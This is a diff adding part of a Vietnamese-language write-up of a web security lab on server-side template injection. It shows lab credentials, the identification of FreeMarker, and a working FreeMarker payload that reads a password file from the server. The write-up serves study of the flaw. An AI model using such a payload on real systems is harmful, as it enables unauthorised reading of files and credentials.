@@ -224,3 +224,29 @@ You can log in to your own account using the following credentials:
 content-manager:C0nt3ntM4n4g3r
 ```
 * Exploit: 
+
+Tìm ra vị trí mắc lỗi SSTI ở bước edit chỉ tiết sản phẩm
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1dea7e8f-c07b-4fbb-a0c4-18fc092b4382)
+
+Truyền vào payload để trigger error nhắm tìm ra Template Engine => `freemarker`
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2ca48bbd-1554-48d6-8324-1f0b54bc190b)
+
+Tìm payload của `freemarker` cho phép đọc file, truyền vào vị trí lỗi:
+
+`${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}`
+
+=> Read được file content:
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7f71203f-994b-4885-8d7e-164cf2b095a6)
+
+File content là dạng bytes => Cần convert sang ASCII
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7aecde13-b0ad-4816-aaae-9058125b5696)
+
+LAB SOLVED!
+
+![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/ce7f2105-214f-4787-9f0e-2a936442f3f8)
+
+
